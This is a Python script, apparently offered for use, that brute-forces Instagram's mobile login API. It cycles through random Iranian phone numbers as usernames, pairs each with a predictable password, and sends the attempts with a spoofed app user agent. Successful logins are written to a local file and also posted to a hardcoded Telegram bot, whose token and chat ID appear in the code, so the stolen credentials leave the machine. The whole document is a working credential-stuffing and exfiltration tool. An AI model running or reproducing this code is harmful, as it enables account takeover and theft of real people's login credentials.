
import os
try:
    import uuid
except:
    os.system('pip install uuid')

try:
    from random import *
except:
    os.systeam('pip install random ')

try:
    import string
except:
    os.system('pip install string')

try:
    import requests
except:
    os.system('pip install requests ')

try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent ')

try:
    from datetime import datetime
except:
    os.system('pip install datetime ')

try:
    import time
except:
    os.system('pip install time')
else:
    os.system('clear')
    try:
        import pyfiglet
    except:
        os.system('pip install pyfiglet')
    else:
        os.system('clear')
        import pyfiglet, os
        from time import sleep
        import webbrowser
        Z = '\x1b[2;31m'
        G = '\x1b[1;32m'
        sleep(0.1)
        P55 = pyfiglet.figlet_format('*3mk_b_d*')
        print(G + P55)
        sleep(2)
        os.system('clear')
        
        import random, uuid, requests, string
        from user_agent import generate_user_agent
        from datetime import datetime
        from random import *
        from time import sleep
        import requests, os, random, json, threading, secrets, uuid
        from colorama import Fore, Style
        from time import sleep
        from datetime import datetime
        from secrets import token_hex
        from uuid import uuid4
        from user_agent import generate_user_agent
        from uuid import uuid4
        aa = 0
        zz = 0
        A = '\x1b[2;39m'
        F = '\x1b[2;32m'
        X = '\x1b[1;33m'
        E = '\x1b[1;31m'
        G = '\x1b[1;32m'
        S = '\x1b[1;33m'
        print(E + '[' + S + '!' + E + ']' + G + ' ID𐇭 ')
        print('\n')
        print("\n*pass the progrm* ")
h , b,s,block = 0,0,0,0
tele = input("[⚠️] PASS→ ?: ")
if "10" in tele:
        
        ID = '1882149852'
        print('\n')
        sleep(2)
        token = '2004840823:AAFbE-RO23TZvH4MbfELkaq1wnp0-pk7qd4'
        w = 'https://t.me/w_b_s1'
        start_msg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=  hi im Khaled ").json()
        id_msg = start_msg['result']['message_id']
        rss = requests.get(w).text
        if 'KEBO' in rss:
            sleep(0.00)
        r = requests.Session()
        user = '0987654321'
        while True:
            us = str(''.join((random.choice(user) for i in range(7))))
            username = '+98912' + us
            password = '0912' + us
            url = 'https://i.instagram.com/api/v1/accounts/login/'
            headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
             'Accept':'*/*', 
             'Cookie':'missing', 
             'Accept-Encoding':'gzip, deflate', 
             'Accept-Language':'en-US', 
             'X-IG-Capabilities':'3brTvw==', 
             'X-IG-Connection-Type':'WIFI', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
            uid = str(uuid4())
            data = {'uuid':uid,  'password':password, 
             'username':username, 
             'device_id':uid, 
             'from_reg':'false', 
             '_csrftoken':'missing', 
             'login_attempt_countn':'0'}
            req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
            if 'logged_in_user' in req_login.text:
                zz += 1
                print(Z + 'H2 يوزر ==> : ' + username + ': H2رمز ==> : ' + password)
                tlg =(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • https://t.me/w_b_s1
\n- 𝑷𝑯 ➪ {username} ✓\n- 𝑷𝑺 ➪ : {password}\n━━━━━━━━━━━━━\n• 𝐅𝐫𝐎𝐦 : hey -- @3mk.bd ''')
                i = requests.post(tlg)
                with open('insta.txt', 'a') as (HACKED):
                    HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
            elif '"message":"challenge_required","challenge"' in req_login.text:
                print(X + 'H22 يوزر A ==> : ' + username + ': H22 رمز ==> : ' + password)
            else:
                requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= - -khaled started - accounts  🗡️ [{zz}] \n+\n H22 🚬🗿[{aa}]  ( {username} ) \n هاك →  ")
                print(F + ' يوزر ==> : ' + username + ':  رمز ==> : ' + password)
                aa += 1

        print('راسل المطور ')
        
